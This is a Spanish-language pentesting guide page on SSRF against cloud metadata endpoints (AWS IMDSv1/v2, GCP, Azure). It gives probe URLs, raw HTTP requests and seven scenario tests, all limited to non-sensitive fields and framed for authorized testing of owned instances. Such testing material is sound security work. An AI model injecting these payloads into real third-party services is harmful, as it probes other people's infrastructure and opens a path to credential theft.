# 🗡️ SSRF hacia metadatos cloud: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### AWS: rutas de identidad no sensible

```text
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://[fd00:ec2::254]/latest/meta-data/instance-id
```

**Cuándo usarlo:** Solo en instancia propia. IPv6 depende de Nitro y subred compatible; no consultar credenciales.

**Fuente:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).


### GCP: rutas de instancia no sensibles

```text
http://metadata.google.internal/computeMetadata/v1/instance/id
http://169.254.169.254/computeMetadata/v1/instance/id
```

**Cuándo usarlo:** Solo proyecto propio. Ambas formas requieren Metadata-Flavor: Google; no consultar service-accounts.

**Fuente:** [Google Cloud](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).


### Azure: ruta de ubicación

```text
http://169.254.169.254/metadata/instance/compute/location?api-version=2025-04-07&format=text
```

**Cuándo usarlo:** Solo VM propia; requiere Metadata: true. La región no demuestra permisos de gestión.

**Fuente:** [Microsoft Learn](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service).


## 🧭 Payloads por contexto

### GCP: cabecera obligatoria

```http
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

**Cuándo usarlo:** Un SSRF que solo controla la URL normalmente no puede aportar esta cabecera. No pedir tokens de cuenta de servicio.

**Fuente:** [Google Cloud](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).


### Azure: versión y cabecera obligatorias

```http
GET /metadata/instance/compute/location?api-version=2025-04-07&format=text HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

**Cuándo usarlo:** Un SSRF que solo controla la URL normalmente no puede aportar Metadata: true. Probar desde VM propia.

**Fuente:** [Microsoft Learn](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service).


## 🔥 Payloads avanzados

### IMDSv2: diferencia entre GET y PUT

```http
GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 60
Content-Length: 0

GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: {TOKEN_IMDS_PROPIO}
```

**Cuándo usarlo:** Tres solicitudes secuenciales en instancia propia: GET sin token debe dar 401 si IMDSv2 es obligatorio; conservar el token solo en memoria y no imprimirlo.

**Fuente:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).


## 🔬 Pruebas guiadas por escenario

### 1. AWS IMDSv1: identidad no sensible

**Objetivo:** Comprobar bloqueo del endpoint sin consultar credenciales.

```json
{"url":"http://169.254.169.254/latest/meta-data/instance-id"}
```

**Interpretación:** Solo en instancia propia/laboratorio. Un ID visible confirma alcance a metadatos, no robo de credenciales.

**Fuente técnica:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 2. AWS IMDSv2: token requerido

**Objetivo:** Comprobar si un GET sin token se rechaza.

```http
GET /latest/meta-data/instance-id HTTP/1.1
Host: 169.254.169.254
```

**Interpretación:** En IMDSv2 obligatorio se espera 401; enviar esta prueba únicamente desde entorno propio.

**Fuente técnica:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 3. AWS IMDSv2: método PUT

**Objetivo:** Verificar si el vector SSRF permite método y cabecera necesarios para token.

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 60
```

**Interpretación:** Laboratorio propio. No registrar ni mostrar el token devuelto; evaluar si el SSRF puede encadenar PUT y GET.

**Fuente técnica:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

### 4. GCP: cabecera obligatoria

**Objetivo:** Comprobar bloqueo de metadata sin Metadata-Flavor.

```http
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
```

**Interpretación:** GCP normalmente exige Metadata-Flavor: Google. Solo probar en proyecto propio.

**Fuente técnica:** [Google Cloud](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).

### 5. GCP: identidad de laboratorio

**Objetivo:** Verificar impacto si el SSRF deja controlar cabeceras.

```http
GET /computeMetadata/v1/instance/id HTTP/1.1
Host: metadata.google.internal
Metadata-Flavor: Google
```

**Interpretación:** No solicitar tokens de servicio; registrar solo ID de instancia de laboratorio.

**Fuente técnica:** [Google Cloud](https://docs.cloud.google.com/compute/docs/metadata/querying-metadata).

### 6. Azure: versión y cabecera

**Objetivo:** Comprobar alcance a dato no sensible de IMDS.

```http
GET /metadata/instance/compute/location?api-version=2025-04-07&format=text HTTP/1.1
Host: 169.254.169.254
Metadata: true
```

**Interpretación:** Solo en VM propia; el dato de región confirma acceso pero no identidad ni permisos de gestión.

**Fuente técnica:** [Microsoft Learn](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service).

### 7. Bloqueo de metadatos por IPv6

**Objetivo:** Verificar que un campo URL rechaza el destino IPv6 de IMDS.

```json
{"url":"http://[fd00:ec2::254]/latest/meta-data/instance-id"}
```

**Interpretación:** fd00:ec2::254 es dirección local única, no link-local; funciona en instancias Nitro con subred IPv6 compatible. Comparar con canary propio y no consultar credenciales.

**Fuente técnica:** [AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
